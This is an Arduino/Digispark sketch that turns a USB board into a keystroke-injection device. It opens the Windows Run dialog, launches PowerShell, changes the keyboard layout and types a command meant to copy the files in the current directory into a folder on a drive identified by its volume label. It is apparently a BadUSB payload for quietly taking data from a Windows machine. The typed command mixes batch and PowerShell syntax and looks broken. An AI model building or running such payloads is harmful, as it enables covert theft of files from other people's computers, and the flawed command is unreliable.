#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("powershell");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
  
    DigiKeyboard.print("Set-WinUserLanguageList -LanguageList en-US -Force");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("for /f %%i in ('\"wmic logicaldisk get name, volumename | find \"DRIVENAME') do (set Driveletter=%%i) cd %Driveletter%$c=\"cpf\";$p=(Get-Location).Path;$f=(Get-ChildItem -Name);$len=($f|Measure-Object).count;for($i=0;$i-le$len;$i++){$s=$f[$i];if(($s|Out-String)-ne($c|Out-String)){Copy-Item $s -Destination $c -Recurse}};Set-WinUserLanguageList -LanguageList en-GB -Force");
    DigiKeyboard.delay(500);

  for(;;){}


}
